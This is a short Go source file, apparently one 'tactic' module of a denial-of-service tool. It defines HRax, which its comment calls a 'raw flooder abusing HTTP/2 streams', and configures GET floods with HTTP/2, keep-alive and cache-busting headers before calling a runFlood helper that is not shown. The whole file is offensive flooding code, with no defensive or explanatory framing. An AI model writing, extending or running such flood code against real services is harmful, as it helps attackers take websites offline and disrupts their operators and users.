package tactics

import "context"

// HRax — raw flooder abusing HTTP/2 streams (keep-alive, h2, agresif).
func HRax(ctx context.Context, p Params) (int64, error) {
	cfg := floodConfig{
		httpMethod: "GET",
		http2:      true,
		keepAlive:  true,
		headers: map[string]string{
			"accept-encoding": "gzip, deflate, br, zstd",
			"cache-control":   "no-cache",
			"pragma":          "no-cache",
		},
	}
	return runFlood(ctx, p, cfg)
}
